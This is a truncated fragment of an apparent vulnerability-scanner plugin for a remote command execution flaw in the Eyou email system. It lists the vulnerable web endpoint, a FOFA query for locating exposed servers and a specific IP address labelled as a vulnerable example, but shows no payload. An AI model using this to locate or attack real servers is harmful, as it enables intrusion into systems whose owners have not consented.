...
class POC(POCBase):
    ...
    _info = {
        ...
        "name" : "亿邮电子邮件系统 远程命令执行",                        # 漏洞名称
        "VulnID" : "",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
        "AppName" : "Eyou 亿邮电子邮件系统",                     # 漏洞应用名称
        "AppVersion" : "",                  # 漏洞应用版本
	    ...
	    title="亿邮电子邮件系统"
        """,                     # fofa搜索语句
        "example" : "https://59.63.125.111:443",     # 存在漏洞的演示url，写一个就可以了
        "exp_img" : "",                      # 先不管  
    }
    ...
    def _verify(self):
        ...
        """
        vuln = [False,""]
        url = self.target + "/webadm/?q=moni_detail.do&action=gragh" # url自己按需调整
